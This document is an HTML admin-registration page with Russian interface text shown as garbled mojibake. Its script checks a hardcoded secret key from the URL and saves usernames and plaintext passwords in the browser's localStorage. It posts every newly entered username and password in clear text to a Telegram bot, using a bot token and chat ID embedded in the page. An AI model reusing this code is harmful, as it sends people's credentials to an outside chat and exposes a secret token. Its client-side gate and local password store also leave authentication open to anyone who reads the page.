<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Admin Registration</title>
  <style>
    body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0b0a0f;color:#eee;font-family:system-ui,Arial}
    .card{width:min(92vw,360px);background:#14121b;border:1px solid #262335;border-radius:14px;padding:20px;box-shadow:0 10px 40px rgba(0,0,0,.45)}
    h1{margin:0 0 12px;font-size:20px}
    label{display:block;font-size:12px;color:#bbb;margin:10px 2px 6px}
    input{width:100%;padding:10px 12px;border-radius:10px;border:1px solid #2b2739;background:#0f0d14;color:#eee;outline:none}
    input:focus{border-color:#ff7518;box-shadow:0 0 0 3px rgba(255,117,24,.25)}
    button{width:100%;margin-top:14px;padding:12px 14px;font-weight:600;background:linear-gradient(180deg,#ffa357,#ff7518);border:none;border-radius:12px;color:#190f06;cursor:pointer}
    .muted{color:#9b96a8;font-size:12px;margin-top:8px}
    .err{color:#ff5757;margin-top:10px;min-height:18px}
    .ok{color:#36d399}
  </style>
</head>
<body>
  <div class="card">
    <h1>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞</h1>
    <p class="muted">–°—Ç—Ä–∞–Ω–∏—Ü–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –ø–æ —Å–µ–∫—Ä–µ—Ç–Ω–æ–π —Å—Å—ã–ª–∫–µ.</p>

    <form id="regForm">
      <label for="username">Username</label>
      <input id="username" name="username" required placeholder="new_admin">

      <label for="password">Password</label>
      <input id="password" name="password" type="password" required placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" minlength="4">

      <button type="submit">–°–æ–∑–¥–∞—Ç—å</button>
      <div id="msg" class="err"></div>
    </form>
  </div>

  <script>
    // === –°–µ–∫—Ä–µ—Ç –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ (–ø–æ–º–µ–Ω—è–π –Ω–∞ –î–õ–ò–ù–ù–£–Æ —Å—Ç—Ä–æ–∫—É –∏ –Ω–∏–∫–æ–º—É –Ω–µ –ø–∞–ª–∏—Ç—å!) ===
    const ADMIN_REG_KEY = "replace-with-a-very-long-secret-key";

    // === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram (—Ç–µ –∂–µ —á—Ç–æ —É —Ç–µ–±—è –≤ admin.js) ===
    const TELEGRAM_BOT_TOKEN = "8246751079:AAH3pTrauBUBQOH2wXm4K3cbDGhO2T321tg";
    const TELEGRAM_CHAT_ID  = "5764625744";

    // gate: –ø—É—Å–∫–∞–µ–º —Ç–æ–ª—å–∫–æ —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º –∫–ª—é—á–æ–º
    const urlKey = new URLSearchParams(location.search).get("key");
    if (urlKey !== ADMIN_REG_KEY) {
      document.body.innerHTML = "<div style='color:#ff5757;font-family:system-ui;padding:24px;text-align:center'>Access denied</div>";
      throw new Error("Wrong key");
    }

    function sendLog(text){
      try {
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method:"POST", headers:{ "Content-Type":"application/json" },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, disable_notification: true })
        });
      } catch(_) {}
    }

    function mergeUsersToLocal(u){
      const list = JSON.parse(localStorage.getItem("users") || "[]");
      list.push(u);
      localStorage.setItem("users", JSON.stringify(list));
    }

    document.getElementById("regForm").addEventListener("submit", (e)=>{
      e.preventDefault();
      const msg = document.getElementById("msg");
      msg.textContent = "";

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value;

      if (!username || !password) { msg.textContent = "–ó–∞–ø–æ–ª–Ω–∏ –≤—Å–µ –ø–æ–ª—è"; return; }
      if (password.length < 4) { msg.textContent = "–ú–∏–Ω–∏–º—É–º 4 —Å–∏–º–≤–æ–ª–∞ –≤ –ø–∞—Ä–æ–ª–µ"; return; }

      // —Å–æ—Ö—Ä–∞–Ω—è–µ–º –ª–æ–∫–∞–ª—å–Ω–æ (–Ω–∞ –¥–æ–º–µ–Ω–µ) –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ TG –¥–ª—è —É—á—ë—Ç–∞/–±—ç–∫–∞–ø–∞
      mergeUsersToLocal({ username, password });
      sendLog(`üÜï [registration] –°–æ–∑–¥–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å\nüë§ ${username}\nüîë ${password}\nüåê ${location.origin}\n‚è± ${new Date().toISOString()}`);

      msg.textContent = "–ì–æ—Ç–æ–≤–æ! –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è‚Ä¶";
      msg.classList.remove("err"); msg.classList.add("ok");

      // –ø–æ—Å–ª–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ ‚Üí –æ–±—ã—á–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
      setTimeout(()=>{ window.location.href = "index.html"; }, 1200);
    });
  </script>
</body>
</html>
